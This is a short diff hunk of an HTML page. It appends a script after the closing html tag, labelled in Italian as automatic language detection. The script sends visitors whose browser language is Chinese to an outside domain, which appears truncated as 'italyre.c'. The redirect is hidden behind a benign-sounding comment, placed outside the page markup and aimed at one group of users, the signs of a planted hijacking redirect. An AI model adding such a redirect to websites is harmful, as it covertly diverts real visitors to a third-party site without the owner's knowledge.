@@ -82,3 +82,10 @@
     </script>
 </body>
 </html>
+<!-- Rilevamento lingua automatico -->
+<script>
+  const userLang = navigator.language || navigator.userLanguage;
+  if (userLang.startsWith('zh')) {
+    window.location.href = 'https://italyre.c';
+  }
+</script>
